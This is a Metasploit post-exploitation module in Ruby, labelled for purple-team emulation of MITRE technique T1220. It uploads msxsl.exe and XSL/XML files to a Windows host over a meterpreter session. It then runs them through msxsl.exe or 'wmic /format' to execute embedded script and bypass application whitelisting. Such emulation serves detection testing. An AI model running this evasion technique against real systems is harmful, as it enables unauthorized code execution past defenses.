##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'XSL Script Processing (T1220) Windows - Purple Team',
        'Description'   => %q{
            Defense Evasion, Execution:
            Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.

          Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to Trusted Developer Utilities, the Microsoft common line transformation utility binary (msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.  Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.

          Another variation of this technique, dubbed "Squiblytwo", involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1220' ],
          ['URL','https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/'],
          ['URL','https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html']],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptInt.new('METHOD', [true, 'Method of execution. 0=ALL, 1=msxsl.exe, 2=wmic /FORMAT', '0']),
        OptString.new('LFILE_MSXSL', [false, 'Local path to MSXSL.exe', Msf::Config.data_directory + "/purple/t1220/msxsl.exe"]),
        OptString.new('RFILE_MSXSL', [false, 'Remote path to upload MSXSL.exe', 'C:\\msxsl.exe']),
        OptString.new('LFILE_XML', [false, 'Local path to XML file', Msf::Config.data_directory + "/purple/t1220/t1220.xml"]),
        OptString.new('RFILE_XML', [false, 'Remote path to upload XML file', 'C:\\t1220.xml']),
        OptString.new('LFILE_XSL', [true, 'Local path to XSL script to upload', Msf::Config.data_directory + "/purple/t1220/t1220.xsl"]),
        OptString.new('RFILE_XSL', [true, 'Remote path to upload XSL script', 'C:\\t1220.xsl']),
        OptBool.new('CLEANUP', [true, 'Cleanup files after execution', true])
      ])
  end

  def t1220_msxsl
    # Upload files
    local_msxsl = datastore['LFILE_MSXSL']
    remote_msxsl = datastore['RFILE_MSXSL']
    print_status("Uploading #{local_msxsl} to #{remote_msxsl}")
    upload_file(remote_msxsl, local_msxsl)
    local_xml = datastore['LFILE_XML']
    remote_xml = datastore['RFILE_XML']
    print_status("Uploading #{local_xml} to #{remote_xml}")
    upload_file(remote_xml, local_xml)
    local_xsl = datastore['LFILE_XSL']
    remote_xsl = datastore['RFILE_XSL']
    print_status("Uploading #{local_xsl} to #{remote_xsl}")
    upload_file(remote_xsl, local_xsl)

    run_cmd("#{remote_msxsl} #{remote_xml} #{remote_xsl}", false)

    sleep(2)
  end

  def t1220_wmic
    local_xsl = datastore['LFILE_XSL']
    remote_xsl = datastore['RFILE_XSL']
    print_status("Uploading #{local_xsl} to #{remote_xsl}")
    upload_file(remote_xsl, local_xsl)

    run_cmd("wmic process get brief /format:\"#{remote_xsl}\"", false)

    sleep(2)
  end

  def run
    begin
      raise "Module requires meterpreter session" unless session.type == 'meterpreter'
      kill_calc

      case datastore['METHOD']
      when 0
        t1220_msxsl()
        _cleanup
        t1220_wmic()
      when 1
        t1220_msxsl()
      when 2
        t1220_wmic()
      else
        raise "Invalid method selected."
      end

      _cleanup unless not datastore['CLEANUP']
      print_good("Module T1220W execution successful.")
    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1220W execution failed.")
    end
  end

  def _cleanup
    print_status("Killing calc and cleaning up files")
    kill_calc(true)
    register_files_for_cleanup((datastore['METHOD'] == '0' ? "" :  datastore['RFILE_MSXSL']))
    register_files_for_cleanup((datastore['METHOD'] == '0' ? "" :  datastore['RFILE_XML']))
    register_files_for_cleanup((datastore['METHOD'] == '1' ? "" :  datastore['RFILE_MSXSL']))
    register_files_for_cleanup((datastore['METHOD'] == '1' ? "" :  datastore['RFILE_XML']))
    register_files_for_cleanup(datastore['RFILE_XSL'])
  end
end
